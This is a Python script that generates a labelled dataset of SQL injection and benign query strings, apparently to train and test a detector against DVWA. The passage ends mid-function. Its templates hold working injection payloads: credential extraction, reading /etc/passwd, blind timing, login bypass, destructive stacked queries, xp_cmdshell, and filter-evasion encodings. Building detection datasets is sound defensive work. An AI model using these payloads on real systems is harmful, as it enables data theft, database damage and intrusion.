import hashlib
import random
import re
import sys
import urllib.parse
from pathlib import Path
from typing import Any, Dict, List, Optional, Set, Tuple

import numpy as np
import pandas as pd

PROJECT_ROOT = Path(__file__).resolve().parent.parent.parent
if str(PROJECT_ROOT) not in sys.path:
    sys.path.insert(0, str(PROJECT_ROOT))

from config.settings import (
    PAYLOADS_ALL_CSV,
    PAYLOADS_DATA_DIR,
    PAYLOADS_TEST_UNSEEN_CSV,
    PAYLOADS_TRAIN_CSV,
    PAYLOADS_VAL_CSV,
)

TOTAL_SAMPLES: int = 15_000
TRAIN_RATIO: float = 0.70
VAL_RATIO: float = 0.15
TEST_RATIO: float = 0.15
RANDOM_SEED: int = 42
OUTPUT_DIR: Path = PAYLOADS_DATA_DIR

FAMILY_NORMAL_BENIGN = "FAMILY_NORMAL_BENIGN"
FAMILY_BOOLEAN_TAUTOLOGY = "FAMILY_BOOLEAN_TAUTOLOGY"
FAMILY_BLIND_BOOLEAN_SUBSTR = "FAMILY_BLIND_BOOLEAN_SUBSTR"
FAMILY_UNION_SELECT = "FAMILY_UNION_SELECT"
FAMILY_ERROR_DIAGNOSTIC = "FAMILY_ERROR_DIAGNOSTIC"
FAMILY_BLIND_TIME_SLEEP = "FAMILY_BLIND_TIME_SLEEP"
FAMILY_SYNTAX_PROBE = "FAMILY_SYNTAX_PROBE"
FAMILY_AUTH_BYPASS = "FAMILY_AUTH_BYPASS"
FAMILY_NUMERIC_STACKED = "FAMILY_NUMERIC_STACKED"
FAMILY_SUBQUERY_EXISTS = "FAMILY_SUBQUERY_EXISTS"
FAMILY_SCHEMA_ENUM = "FAMILY_SCHEMA_ENUM"
FAMILY_ENCODED_OBFUSCATED = "FAMILY_ENCODED_OBFUSCATED"
FAMILY_DVWA_PARAMS = "FAMILY_DVWA_PARAMS"

SQL_KEYWORDS = [
    "select", "union", "from", "where", "or", "and", "insert", "update",
    "delete", "drop", "alter", "create", "table", "information_schema",
    "sleep", "benchmark", "version", "substr", "substring", "ascii",
    "length", "concat", "extractvalue", "updatexml", "case", "when",
    "then", "else", "end", "exists", "null", "like", "order by", "group by"
]


def apply_case_variation(text: str, rng: random.Random) -> str:
    tokens = text.split(" ")
    res = []
    for token in tokens:
        sub_tokens = re.split(r'([(),=\'"])', token)
        processed = []
        for st in sub_tokens:
            if st.lower() in SQL_KEYWORDS:
                choice = rng.choice(["lower", "upper", "title", "mixed"])
                if choice == "lower":
                    processed.append(st.lower())
                elif choice == "upper":
                    processed.append(st.upper())
                elif choice == "title":
                    processed.append(st.capitalize())
                else:
                    processed.append("".join(c.upper() if rng.random() > 0.5 else c.lower() for c in st))
            else:
                processed.append(st)
        res.append("".join(processed))
    return " ".join(res)


def apply_whitespace_variation(text: str, rng: random.Random) -> Tuple[str, str]:
    ws_options = [
        ("standard", " "),
        ("multi_space", "  "),
        ("plus", "+"),
        ("url_space", "%20"),
        ("inline_comment", "/**/"),
        ("mixed_space", rng.choice(["  ", "+", "%20", "/**/"]))
    ]
    name, chosen_ws = rng.choice(ws_options)
    parts = text.split("'")
    for i in range(0, len(parts), 2):
        parts[i] = parts[i].replace(" ", chosen_ws)
    return "'".join(parts), name


def apply_quote_variation(text: str, rng: random.Random) -> Tuple[str, str]:
    quote_styles = ["single_quote", "double_quote", "parenthesized"]
    style = rng.choice(quote_styles)

    if style == "single_quote":
        return text, "single_quote"

    if style == "double_quote":
        if "'" in text:
            transformed = text.replace("'", '"')
            return transformed, "double_quote"
        return text, "single_quote"

    if style == "parenthesized":
        if "1' OR" in text:
            return text.replace("1' OR", "1') OR", 1), "parenthesized"
        elif "1' AND" in text:
            return text.replace("1' AND", "1') AND", 1), "parenthesized"
        elif "admin'" in text:
            return text.replace("admin'", "admin')", 1), "parenthesized"
        return text, "single_quote"

    return text, "single_quote"


def apply_comment_variation(text: str, rng: random.Random) -> Tuple[str, str]:
    comment_options = [
        ("dash_dash_space", "-- "),
        ("dash_dash_dash", "-- -"),
        ("hash", "#"),
        ("url_hash", "%23"),
        ("inline_block_comment", "/* comment */"),
        ("semicolon_comment", ";-- ")
    ]
    name, chosen_comment = rng.choice(comment_options)
    if "{COMMENT}" in text:
        return text.replace("{COMMENT}", chosen_comment), name
    elif not any(text.endswith(c[1]) for c in comment_options):
        return f"{text}{chosen_comment}", name
    return text, name


def apply_encoding_variation(text: str, rng: random.Random) -> Tuple[str, str]:
    encoding_types = ["raw", "url_encoded", "partially_encoded"]
    enc_choice = rng.choice(encoding_types)

    if enc_choice == "raw":
        return text, "raw"
    elif enc_choice == "url_encoded":
        return urllib.parse.quote_plus(text), "url_encoded"
    else:
        res = []
        for char in text:
            if char in ["'", '"', " ", "=", "<", ">", ";", "/", "*"] and rng.random() > 0.4:
                res.append(urllib.parse.quote_plus(char))
            else:
                res.append(char)
        return "".join(res), "partially_encoded"


def semantic_normalize(payload: str) -> str:
    p = payload
    for _ in range(3):
        decoded = urllib.parse.unquote_plus(p)
        if decoded == p:
            break
        p = decoded

    p = re.sub(r'(--.*$|#.*$|/\*.*?\*/)', '', p, flags=re.MULTILINE)
    p = re.sub(r'\s+', '', p).lower()
    return p


ATTACK_FAMILIES = {
    "FAMILY_BOOLEAN_TAUTOLOGY": {
        "category": "sqli_boolean",
        "templates": [
            "id=1' OR {EXPR} {COMMENT}",
            "id=1' AND {EXPR} {COMMENT}",
            "username=admin' OR {EXPR} {COMMENT}",
            "id=1' OR ({EXPR}) {COMMENT}",
            "id='1' OR '{VAL}'='{VAL}'",
            "id=1' OR {VAL}={VAL} {COMMENT}",
            "id=1' OR NOT ({EXPR}) {COMMENT}",
            "id=1' WHERE 1=1 OR {EXPR} {COMMENT}",
            "id=1' OR 'x'='x' {COMMENT}",
            "id=1' AND (2>1) {COMMENT}",
            "id=1' OR {VAL}>{VAL_MIN} {COMMENT}",
            "id=1' OR ASCII(LOWER(SUBSTRING('{CHAR}',1,1)))={ASCII_VAL} {COMMENT}",
            "username=admin' OR 1=1-- &password=pass",
            "id=1' OR 'bar' LIKE 'b%' {COMMENT}",
            "id=1' OR true {COMMENT}",
            "id=1' OR false OR {EXPR} {COMMENT}"
        ]
    },
    "FAMILY_UNION_SELECT": {
        "category": "sqli_union",
        "templates": [
            "id=1' UNION SELECT {COLS} {COMMENT}",
            "id=-1' UNION SELECT {COLS} {COMMENT}",
            "id=0' UNION ALL SELECT {COLS} {COMMENT}",
            "id=1' UNION SELECT NULL,{SUBQUERY} {COMMENT}",
            "id=1' UNION SELECT {SUBQUERY},NULL {COMMENT}",
            "id=1' UNION DISTINCT SELECT {COLS} {COMMENT}",
            "id=9999' UNION SELECT 1,concat(user,0x3a,password) FROM {TABLE} {COMMENT}",
            "id=-1' UNION SELECT 1,group_concat(table_name) FROM information_schema.tables WHERE table_schema=database() {COMMENT}",
            "id=-1' UNION SELECT 1,column_name FROM information_schema.columns WHERE table_name='users' {COMMENT}",
            "id=1' UNION SELECT 1,schema_name FROM information_schema.schemata {COMMENT}",
            "id=1' UNION SELECT 1,CONCAT_WS(':',user,password) FROM users {COMMENT}",
            "id=1' UNION SELECT 1,LOAD_FILE('/etc/passwd') {COMMENT}",
            "id=1' UNION SELECT 1,@@version {COMMENT}",
            "id=1' UNION SELECT 1,@@datadir {COMMENT}"
        ]
    },
    "FAMILY_ERROR_DIAGNOSTIC": {
        "category": "sqli_error",
        "templates": [
            "id=1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT {SUBQUERY}),FLOOR(RAND(0)*2))x FROM {TABLE} GROUP BY x)a) {COMMENT}",
            "id=1' AND EXTRACTVALUE(1, CONCAT(0x7e, ({SUBQUERY}), 0x7e)) {COMMENT}",
            "id=1' AND UPDATEXML(1, CONCAT(0x7e, ({SUBQUERY}), 0x7e), 1) {COMMENT}",
            "id=1' AND EXP(~(SELECT * FROM (SELECT 1)a)) {COMMENT}",
            "id=1' AND (SELECT 2*(IF((SELECT * FROM (SELECT 1)a), 8446744073709551610, 8446744073709551610))) {COMMENT}",
            "id=1' AND JSON_KEYS((SELECT * FROM (SELECT 1)a)) {COMMENT}",
            "id=1' AND GTID_SUBSET(CONCAT(0x7e,({SUBQUERY}),0x7e),1) {COMMENT}",
            "id=1' AND ST_LatFromGeoHash(CONCAT(0x7e,({SUBQUERY}),0x7e)) {COMMENT}",
            "id=1' AND GeometryCollection((SELECT * FROM (SELECT * FROM (SELECT 1)a)b)) {COMMENT}"
        ]
    },
    "FAMILY_BLIND_TIME_SLEEP": {
        "category": "sqli_blind_time",
        "templates": [
            "id=1' AND (SELECT SLEEP({SLEEP_SEC})) {COMMENT}",
            "id=1' AND IF({EXPR}, SLEEP({SLEEP_SEC}), 0) {COMMENT}",
            "id=1' OR IF({EXPR}, SLEEP({SLEEP_SEC}), 0) {COMMENT}",
            "id=1' AND (SELECT IF(1=1,SLEEP({SLEEP_SEC}),0)) {COMMENT}",
            "id=1' AND BENCHMARK(10000000,MD5(0x41)) {COMMENT}",
            "id=1' AND (SELECT * FROM (SELECT(SLEEP({SLEEP_SEC})))a) {COMMENT}",
            "id=1' WAITFOR DELAY '0:0:{SLEEP_SEC}' {COMMENT}",
            "id=1' AND (SELECT CASE WHEN ({EXPR}) THEN SLEEP({SLEEP_SEC}) ELSE 0 END) {COMMENT}",
            "id=1' OR (SELECT CASE WHEN (SUBSTRING(version(),1,1)='5') THEN SLEEP({SLEEP_SEC}) ELSE 0 END) {COMMENT}",
            "id=1' AND IF((SELECT user())='root', SLEEP({SLEEP_SEC}), 0) {COMMENT}"
        ]
    },
    "FAMILY_BLIND_BOOLEAN_SUBSTR": {
        "category": "sqli_blind_boolean",
        "templates": [
            "id=1' AND SUBSTRING(({SUBQUERY}),{POS},1)='{CHAR}' {COMMENT}",
            "id=1' AND ASCII(SUBSTRING(({SUBQUERY}),{POS},1))={ASCII_VAL} {COMMENT}",
            "id=1' AND MID(({SUBQUERY}),{POS},1)='{CHAR}' {COMMENT}",
            "id=1' AND (SELECT COUNT(*) FROM {TABLE})>{VAL_MIN} {COMMENT}",
            "id=1' AND LENGTH(({SUBQUERY}))={VAL} {COMMENT}",
            "id=1' AND (SELECT SUBSTR(user(),1,1))='{CHAR}' {COMMENT}",
            "id=1' AND ORD(MID((SELECT database()),{POS},1))>{ASCII_VAL} {COMMENT}",
            "id=1' AND (SELECT ASCII(LOWER(SUBSTRING(table_name,{POS},1))) FROM information_schema.tables WHERE table_schema=database() LIMIT 1)={ASCII_VAL} {COMMENT}",
            "id=1' AND BINARY SUBSTRING(({SUBQUERY}),{POS},1)='{CHAR}' {COMMENT}",
            "id=1' AND STRCMP(SUBSTRING(({SUBQUERY}),{POS},1), '{CHAR}')=0 {COMMENT}"
        ]
    },
    "FAMILY_SYNTAX_PROBE": {
        "category": "sqli_probe",
        "templates": [
            "id='",
            'id="',
            "id=1'",
            'id=1"',
            "id=1'--",
            "id=1'#",
            "id=1'/*",
            "id=\\",
            "id=1\\",
            "id=1'))",
            "id=1' OR '",
            "id=1' AND '",
            "id=1' HAVING 1=1 {COMMENT}",
            "id=1' GROUP BY 1 {COMMENT}",
            "id=1' ORDER BY {VAL_MIN} {COMMENT}"
        ]
    },
    "FAMILY_AUTH_BYPASS": {
        "category": "sqli_auth_bypass",
        "templates": [
            "username=admin'-- &password=123",
            "username=admin' #&password=pass",
            "username=admin'/*&password=pass",
            "username=' or 1=1-- &password=123",
            "username=' or '1'='1&password=foo",
            "username=admin' or '1'='1'#&password=pass",
            "username=admin' or 'a'='a&password=foo",
            "username=' or ''='&password=' or ''='",
            "username=1' OR '1'='1' LIMIT 1#&password=x",
            "username=admin' OR 1=1 LIMIT 1#&password=x",
            "username=\" or \"\"=\"&password=\" or \"\"=\"",
            "username=') or ('1'='1&password=1"
        ]
    },
    "FAMILY_NUMERIC_STACKED": {
        "category": "sqli_stacked",
        "templates": [
            "id=1; SELECT {COLS} {COMMENT}",
            "id=1; DROP TABLE temp_data {COMMENT}",
            "id=1; INSERT INTO users(user,password) VALUES ('hacker','pass') {COMMENT}",
            "id=1; UPDATE users SET password='hacked' WHERE user='admin' {COMMENT}",
            "id=1; WAITFOR DELAY '0:0:{SLEEP_SEC}' {COMMENT}",
            "id=1; SHUTDOWN {COMMENT}",
            "id=1; EXEC xp_cmdshell('whoami') {COMMENT}",
            "id=1; BEGIN DECLARE @v VARCHAR(8000) {COMMENT}"
        ]
    },
    "FAMILY_SUBQUERY_EXISTS": {
        "category": "sqli_subquery",
        "templates": [
            "id=1' AND EXISTS(SELECT * FROM {TABLE} WHERE {EXPR}) {COMMENT}",
            "id=1' AND (SELECT COUNT(*) FROM {TABLE})>0 {COMMENT}",
            "id=1' AND NOT EXISTS(SELECT * FROM users WHERE user='superadmin') {COMMENT}",
            "id=1' AND (SELECT 1 FROM (SELECT COUNT(*), table_name FROM information_schema.tables GROUP BY table_name)t) {COMMENT}",
            "id=1' AND 1=(SELECT 1 FROM dual WHERE {EXPR}) {COMMENT}",
            "id=1' AND (SELECT 'a')=(SELECT 'a' FROM dual WHERE {EXPR}) {COMMENT}",
            "id=1' AND IN ({SUBQUERY}) {COMMENT}"
        ]
    },
    "FAMILY_SCHEMA_ENUM": {
        "category": "sqli_schema",
        "templates": [
            "id=1' UNION SELECT 1,schema_name FROM information_schema.schemata {COMMENT}",
            "id=1' UNION SELECT 1,table_name FROM information_schema.tables WHERE table_schema=DATABASE() {COMMENT}",
            "id=1' UNION SELECT 1,column_name FROM information_schema.columns WHERE table_name='{TABLE}' {COMMENT}",
            "id=1' UNION SELECT table_schema,table_name FROM information_schema.tables {COMMENT}",
            "id=1' UNION SELECT 1,grantee FROM information_schema.user_privileges {COMMENT}",
            "id=1' UNION SELECT 1,routine_name FROM information_schema.routines {COMMENT}",
            "id=1' UNION SELECT 1,PLUGIN_NAME FROM information_schema.PLUGINS {COMMENT}",
            "id=1' UNION SELECT 1,table_name FROM information_schema.views {COMMENT}"
        ]
    },
    "FAMILY_ENCODED_OBFUSCATED": {
        "category": "sqli_evasion",
        "templates": [
            "id=1'/**/UN/**/ION/**/SE/**/LECT/**/{COLS} {COMMENT}",
            "id=1'%20OR%201=1%23",
            "id=1' %2b (SELECT 1) %2b '",
            "id=1'/*!50000UNION*//*!50000SELECT*/ {COLS} {COMMENT}",
            "id=1'/*!UNION*//*!SELECT*/ 1,2 {COMMENT}",
            "id=1' %00 UNION SELECT {COLS} {COMMENT}",
            "id=1' %0a OR %0a 1=1 {COMMENT}",
            "id=1' AND 0x31=0x31 {COMMENT}",
            "id=1' UNION SELECT CHAR(117,115,101,114),CHAR(112,97,115,115) {COMMENT}",
            "id=1' OR CONCAT(CHAR(97),CHAR(100),CHAR(109),CHAR(105),CHAR(110))='admin' {COMMENT}"
        ]
    },
    "FAMILY_DVWA_PARAMS": {
        "category": "sqli_dvwa_specific",
        "templates": [
            "id=1' OR '1'='1&Submit=Submit",
            "id=1' UNION SELECT user,password FROM users#&Submit=Submit",
            "id=1' AND SLEEP({SLEEP_SEC})#&Submit=Submit",
            "id=1' AND 1=1#&Submit=Submit",
            "username=admin' OR 1=1#&password=123&Login=Login",
            "username=admin'-- &password=pass&Login=Login",
            "id=1' UNION SELECT 1,2#&Submit=Submit",
            "id=1' OR '1'='1'#&Submit=Submit"
        ]
    }
}

NORMAL_TEMPLATES = [
    "id={NUM}&Submit=Submit",
    "id={NUM}",
    "id={DVWA_ID}&Submit=Submit",
    "id={DVWA_ID}",
    "id={BENIGN_NAME}&Submit=Submit",
    "id=O'Connor&Submit=Submit",
    "id=Smith's&Submit=Submit",
    "id=D'Angelo&Submit=Submit",
    "id=McDonald's&Submit=Submit",
    "id=L'Oreal&Submit=Submit",
    "title=Director's+Cut&genre={GENRE}",
    "id={NUM}&user_token={TOKEN}&Submit=Submit",
    "id={DVWA_ID}&user_token={TOKEN}&Submit=Submit",
    "username={DVWA_USER}&password={DVWA_PASS}&Login=Login",
    "username={DVWA_USER}&password=password123&Login=Login",
    "username=admin&password=password&Login=Login",
    "username=admin&password=P@ssw'ord!&Login=Login",
    "username={DVWA_USER}&password={DVWA_PASS}&user_token={TOKEN}&Login=Login",
    "search={SEARCH_KEYWORD}&category={CATEGORY}&page={NUM}",
    "q=bảo+mật+thông+tin&lang=vi&sort=desc",
    "q=an+toàn+cơ+sở+dữ+liệu&filter=all",
    "filter=date:{DATE}&author={BENIGN_NAME}",
    "email={DVWA_USER}@company.org&newsletter=true",
    "uuid={TOKEN}&action=view_profile",
    "page={PAGE}&limit={LIMIT}&order={ORDER_COL}&direction={SORT_DIR}",
    "product_id={PRODUCT_CODE}&status=active",
    "view=dashboard&tab=overview&refresh=true",
    "report_type=monthly&year=2026&format=pdf",
    "/dvwa/images/logo.png",
    "/dvwa/css/main.css",
    "/dvwa/js/dvwaPage.js",
    "/security.php?phpids=0",
    "/instructions.php?doc=readme",
    "/favicon.ico",
    "/assets/fonts/inter-regular.woff2"
]

EXPR_LIST = [
    "1=1", "2>1", "'a'='a'", "CHAR(97)='a'", "LENGTH('test')=4", "7=7", "100<200", "ASCII('A')=65",
    "3*3=9", "4+4=8", "SUBSTRING('hello',1,1)='h'", "DATABASE() IS NOT NULL", "NULL IS NULL",
    "LOWER('A')='a'", "HEX(10)='A'", "BIN(2)='10'", "ROUND(3.14)=3", "ABS(-5)=5"
]
SUBQUERIES = [
    "SELECT password FROM users WHERE user='admin'", "SELECT version()", "SELECT user()",
    "SELECT database()", "SELECT current_user()", "SELECT schema_name FROM information_schema.schemata LIMIT 1",
    "SELECT table_name FROM information_schema.tables LIMIT 1", "SELECT @@datadir"
]
TABLES = [
    "users", "information_schema.tables", "information_schema.columns", "dvwa.users",
    "accounts", "customers", "orders", "sessions", "tokens", "audit_log", "products", "settings"
]
COLS_LIST = [
    "1,2", "user,password", "first_name,last_name", "user_id,avatar", "1,version()",
    "null,null", "1,database()", "id,email", "role,token", "name,price"
]
CHAR_LIST = ["a", "b", "c", "d", "e", "f", "1", "2", "admin", "root", "guest", "test"]
DVWA_USERS = [
    "admin", "gordonb", "1337", "pablo", "smithy", "guest", "test_user", "alice", "bob",
    "charlie", "david", "emma", "frank", "grace", "helen", "ian", "jack", "kevin", "developer"
]
DVWA_IDS = ["1", "2", "3", "4", "5", "10", "20", "50", "99", "100", "150", "200"]
DVWA_BENIGN_NAMES = [
    "John+Doe", "Alice+Smith", "Bob+Johnson", "Charlie+Brown", "David+Miller",
    "O'Connor", "Smith's", "D'Angelo", "McDonald's", "Nguyễn+Văn+A", "Trần+Thị+B",
    "Lê+Thị+C", "Phạm+Văn+D", "Hoàng+Minh", "Vũ+Thị+Hoa", "Robert+Lee", "Emily+Davis"
]
DVWA_BENIGN_PASSWORDS = [
    "password", "password123", "admin", "123456", "LetMeIn!", "P@ssw'ord!",
    "SuperSecret!", "Welcome2026!", "pass'word99", "secret_key", "qwerty", "master123"
]
SEARCH_KEYWORDS = [
    "laptop", "security", "database", "python", "firewall", "router", "network",
    "machine+learning", "cloud", "docker", "kubernetes", "linux", "authentication", "api"
]
CATEGORIES = ["electronics", "books", "courses", "software", "hardware", "research", "tutorials"]
GENRES = ["action", "thriller", "documentary", "comedy", "drama", "sci-fi"]
ORDER_COLS = ["created_at", "updated_at", "price", "id", "rating", "popularity"]
SORT_DIRS = ["asc", "desc"]


class PayloadGenerator:
    def __init__(self, seed: int = RANDOM_SEED):
        self.seed = seed
        self.rng = random.Random(seed)

    def _instantiate_template(
        self,
        template_str: str,
        category: str,
        family_id: str,
        template_id: str
    ) -> Dict[str, Any]:
        raw_text = template_str

        raw_text = raw_text.replace("{EXPR}", self.rng.choice(EXPR_LIST))
        raw_text = raw_text.replace("{SUBQUERY}", self.rng.choice(SUBQUERIES))
        raw_text = raw_text.replace("{TABLE}", self.rng.choice(TABLES))
        raw_text = raw_text.replace("{COLS}", self.rng.choice(COLS_LIST))
        raw_text = raw_text.replace("{CHAR}", self.rng.choice(CHAR_LIST))
        raw_text = raw_text.replace("{ASCII_VAL}", str(self.rng.randint(48, 122)))
        raw_text = raw_text.replace("{VAL}", str(self.rng.randint(1, 999)))
        raw_text = raw_text.replace("{VAL_MIN}", str(self.rng.randint(0, 10)))
        raw_text = raw_text.replace("{POS}", str(self.rng.randint(1, 16)))
        raw_text = raw_text.replace("{SLEEP_SEC}", str(self.rng.choice([1, 2, 3, 5])))
        raw_text = raw_text.replace("{NUM}", str(self.rng.randint(1, 10000)))
        raw_text = raw_text.replace("{DVWA_ID}", self.rng.choice(DVWA_IDS))
        raw_text = raw_text.replace("{DVWA_USER}", self.rng.choice(DVWA_USERS))
        raw_text = raw_text.replace("{DVWA_PASS}", self.rng.choice(DVWA_BENIGN_PASSWORDS))
        raw_text = raw_text.replace("{BENIGN_NAME}", self.rng.choice(DVWA_BENIGN_NAMES))
        raw_text = raw_text.replace("{SEARCH_KEYWORD}", self.rng.choice(SEARCH_KEYWORDS))
        raw_text = raw_text.replace("{CATEGORY}", self.rng.choice(CATEGORIES))
        raw_text = raw_text.replace("{GENRE}", self.rng.choice(GENRES))
        raw_text = raw_text.replace("{PAGE}", str(self.rng.randint(1, 50)))
        raw_text = raw_text.replace("{LIMIT}", str(self.rng.choice([10, 20, 50, 100])))
        raw_text = raw_text.replace("{ORDER_COL}", self.rng.choice(ORDER_COLS))
        raw_text = raw_text.replace("{SORT_DIR}", self.rng.choice(SORT_DIRS))
        raw_text = raw_text.replace("{DATE}", f"2026-{self.rng.randint(1,12):02d}-{self.rng.randint(1,28):02d}")
        raw_text = raw_text.replace("{PRODUCT_CODE}", f"SKU-{self.rng.randint(1000, 9999)}")
        raw_text = raw_text.replace("{TOKEN}", hashlib.md5(str(self.rng.random()).encode()).hexdigest())

        variant_types: List[str] = []
        final_payload = raw_text

        if category != "normal":
            if "{COMMENT}" in final_payload or self.rng.random() < 0.35:
                final_payload, comment_style = apply_comment_variation(final_payload, self.rng)
                variant_types.append(f"comment:{comment_style}")

            if self.rng.random() < 0.40:
                final_payload = apply_case_variation(final_payload, self.rng)
                variant_types.append("case:mixed")

            if self.rng.random() < 0.30:
                final_payload, ws_style = apply_whitespace_variation(final_payload, self.rng)
                variant_types.append(f"ws:{ws_style}")

            if self.rng.random() < 0.25:
                final_payload, quote_style = apply_quote_variation(final_payload, self.rng)
                variant_types.append(f"quote:{quote_style}")

        enc_type = "raw"
        if self.rng.random() < 0.15:
            final_payload, enc_type = apply_encoding_variation(final_payload, self.rng)
            variant_types.append(f"enc:{enc_type}")

        label = 0 if category.startswith("normal") else 1
        variant_str = "|".join(variant_types) if variant_types else "standard"

        exact_hash = hashlib.sha256(final_payload.encode("utf-8")).hexdigest()
        norm_str = semantic_normalize(final_payload)
        norm_hash = hashlib.sha256(norm_str.encode("utf-8")).hexdigest()

        return {
            "payload": final_payload,
            "label": label,
            "attack_type": category,
            "family_id": family_id,
            "template_id": template_id,
            "variant_type": variant_str,
            "encoding_type": enc_type,
            "normalized_hash": norm_hash,
            "payload_hash": exact_hash,
            "length": len(final_payload)
        }

    def generate_full_dataset(self, target_count: int = TOTAL_SAMPLES) -> Tuple[List[Dict[str, Any]], Dict[str, int]]:
        dataset: List[Dict[str, Any]] = []
        seen_exact_hashes: Dict[str, int] = {}
        norm_cluster_counts: Dict[str, int] = {}

        stats = {
            "generated": 0,
            "unique": 0,
            "duplicates_removed": 0,
            "label_conflicts": 0,
            "cluster_limit_skips": 0
        }

        normal_target = target_count // 2
        sqli_target = target_count - normal_target
        sqli_families = sorted(list(ATTACK_FAMILIES.keys()))
        target_per_family = sqli_target // len(sqli_families)

        norm_templates = NORMAL_TEMPLATES
        norm_cnt = 0
        attempts = 0
        max_attempts = normal_target * 40

        while norm_cnt < normal_target and attempts < max_attempts:
            attempts += 1
            t_idx = self.rng.randint(0, len(norm_templates) - 1)
            t_str = norm_templates[t_idx]
            t_id = f"NORM_{t_idx+1:03d}"

            rec = self._instantiate_template(t_str, "normal", FAMILY_NORMAL_BENIGN, t_id)
            stats["generated"] += 1
            p_hash = rec["payload_hash"]
            n_hash = rec["normalized_hash"]
            lbl = rec["label"]

            if p_hash in seen_exact_hashes:
                if seen_exact_hashes[p_hash] != lbl:
                    stats["label_conflicts"] += 1
                else:
                    stats["duplicates_removed"] += 1
                continue

            if norm_cluster_counts.get(n_hash, 0) >= 60:
                stats["cluster_limit_skips"] += 1
                continue

            seen_exact_hashes[p_hash] = lbl
            norm_cluster_counts[n_hash] = norm_cluster_counts.get(n_hash, 0) + 1
            dataset.append(rec)
            norm_cnt += 1
            stats["unique"] += 1

        for fam_idx, fam_id in enumerate(sqli_families):
            fam_info = ATTACK_FAMILIES[fam_id]
            cat = fam_info["category"]
            templates = fam_info["templates"]
            fam_target = target_per_family if fam_idx < len(sqli_families) - 1 else (sqli_target - (target_per_family * fam_idx))
            fam_cnt = 0
            fam_attempts = 0
            fam_max_attempts = fam_target * 40

            while fam_cnt < fam_target and fam_attempts < fam_max_attempts:
                fam_attempts += 1
                t_idx = self.rng.randint(0, len(templates) - 1)
                t_str = templates[t_idx]
                t_id = f"{fam_id[:8]}_{t_idx+1:03d}"

                rec = self._instantiate_template(t_str, cat, fam_id, t_id)
                stats["generated"] += 1
                p_hash = rec["payload_hash"]
                n_hash = rec["normalized_hash"]
                lbl = rec["label"]

                if p_hash in seen_exact_hashes:
                    if seen_exact_hashes[p_hash] != lbl:
                        stats["label_conflicts"] += 1
                    else:
                        stats["duplicates_removed"] += 1
                    continue

                if norm_cluster_counts.get(n_hash, 0) >= 50:
                    stats["cluster_limit_skips"] += 1
                    continue

                seen_exact_hashes[p_hash] = lbl
                norm_cluster_counts[n_hash] = norm_cluster_counts.get(n_hash, 0) + 1
                dataset.append(rec)
                fam_cnt += 1
                stats["unique"] += 1

        top_off_attempts = 0
        while len(dataset) < target_count and top_off_attempts < 10000:
            top_off_attempts += 1
            fam_id = self.rng.choice(sqli_families)
            fam_info = ATTACK_FAMILIES[fam_id]
            cat = fam_info["category"]
            templates = fam_info["templates"]
            t_idx = self.rng.randint(0, len(templates) - 1)
            t_str = templates[t_idx]
            t_id = f"{fam_id[:8]}_{t_idx+1:03d}"
            rec = self._instantiate_template(t_str, cat, fam_id, t_id)
            stats["generated"] += 1
            p_hash = rec["payload_hash"]
            lbl = rec["label"]
            if p_hash not in seen_exact_hashes:
                seen_exact_hashes[p_hash] = lbl
                dataset.append(rec)
                stats["unique"] += 1

        if len(dataset) < target_count:
            raise RuntimeError(
                f"Failed to generate sufficient unique samples! Generated {len(dataset):,}/{target_count:,}."
            )

        return dataset, stats


def split_dataset_by_family(
    df: pd.DataFrame,
    train_ratio: float = TRAIN_RATIO,
    val_ratio: float = VAL_RATIO,
    test_ratio: float = TEST_RATIO,
    seed: int = RANDOM_SEED
) -> Tuple[pd.DataFrame, pd.DataFrame, pd.DataFrame]:
    if len(df) == 0:
        raise ValueError("Cannot split an empty dataset!")

    total_target = len(df)
    target_train_total = int(total_target * train_ratio)
    target_val_total = int(total_target * val_ratio)
    target_test_total = total_target - target_train_total - target_val_total

    df_sqli = pd.DataFrame(df[df["label"] == 1])
    df_normal = pd.DataFrame(df[df["label"] == 0])

    test_unseen_families = [FAMILY_NUMERIC_STACKED, FAMILY_ENCODED_OBFUSCATED]
    val_families = [FAMILY_SCHEMA_ENUM, FAMILY_SYNTAX_PROBE]
    family_series = pd.Series(df_sqli["family_id"])
    train_families = [
        fam for fam in family_series.unique()
        if fam not in test_unseen_families and fam not in val_families
    ]

    sqli_test = pd.DataFrame(df_sqli[family_series.isin(test_unseen_families)])
    sqli_val = pd.DataFrame(df_sqli[family_series.isin(val_families)])
    sqli_train = pd.DataFrame(df_sqli[family_series.isin(train_families)])

    needed_norm_test = target_test_total - len(sqli_test)
    needed_norm_val = target_val_total - len(sqli_val)
    needed_norm_train = target_train_total - len(sqli_train)

    if needed_norm_test < 0 or needed_norm_val < 0 or needed_norm_train < 0:
        raise RuntimeError("SQLi family sizes exceed split target partitions. Adjust family holdout distribution.")

    df_normal_shuffled = df_normal.sample(frac=1.0, random_state=seed).reset_index(drop=True)

    norm_test = pd.DataFrame(df_normal_shuffled.iloc[:needed_norm_test])
    norm_val = pd.DataFrame(df_normal_shuffled.iloc[needed_norm_test:needed_norm_test + needed_norm_val])
    norm_train = pd.DataFrame(df_normal_shuffled.iloc[needed_norm_test + needed_norm_val:needed_norm_test + needed_norm_val + needed_norm_train])

    df_train = pd.concat([norm_train, sqli_train], ignore_index=True).sample(frac=1.0, random_state=seed).reset_index(drop=True)
    df_val = pd.concat([norm_val, sqli_val], ignore_index=True).sample(frac=1.0, random_state=seed).reset_index(drop=True)
    df_test_unseen = pd.concat([norm_test, sqli_test], ignore_index=True).sample(frac=1.0, random_state=seed).reset_index(drop=True)

    train_set = set(df_train["payload"])
    val_set = set(df_val["payload"])
    test_set = set(df_test_unseen["payload"])

    train_val_overlap = train_set.intersection(val_set)
    train_test_overlap = train_set.intersection(test_set)
    val_test_overlap = val_set.intersection(test_set)

    if train_val_overlap or train_test_overlap or val_test_overlap:
        raise RuntimeError(
            f"DATA LEAKAGE DETECTED! Exact duplicate payloads across splits: "
            f"Train/Val={len(train_val_overlap)}, Train/Test={len(train_test_overlap)}, Val/Test={len(val_test_overlap)}"
        )

    train_fam_set = set(pd.Series(df_train[df_train["label"] == 1]["family_id"]).unique())
    val_fam_set = set(pd.Series(df_val[df_val["label"] == 1]["family_id"]).unique())
    test_fam_set = set(pd.Series(df_test_unseen[df_test_unseen["label"] == 1]["family_id"]).unique())

    if not train_fam_set.isdisjoint(test_fam_set):
        raise RuntimeError(f"FAMILY LEAKAGE DETECTED between Train and Test Unseen: {train_fam_set.intersection(test_fam_set)}")
    if not val_fam_set.isdisjoint(test_fam_set):
